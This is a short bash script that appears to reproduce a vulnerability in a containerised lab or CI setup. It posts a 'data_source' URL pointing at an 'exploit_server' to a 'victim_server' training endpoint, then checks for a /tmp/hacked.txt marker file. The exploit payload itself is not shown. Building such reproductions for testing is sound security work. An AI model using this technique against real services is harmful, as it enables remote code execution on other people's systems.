#!/bin/bash
IS_CI_RUN=$1
if [ "$IS_CI_RUN" == "true" ]; then
  BASE_URL="http://victim_server:5050"
else
  BASE_URL="http://127.0.0.1:5050"
fi


echo "[*] Triggering exploit by sending POST to victim_server..."
curl -X POST \
  -F "data_source=http://exploit_server:4444" \
  "$BASE_URL/train"

echo ""
echo "[*] Checking if /tmp/hacked.txt was written inside victim_server container..."
docker exec victim_server ls -l /tmp || true
docker exec victim_server cat /tmp/hacked.txt || true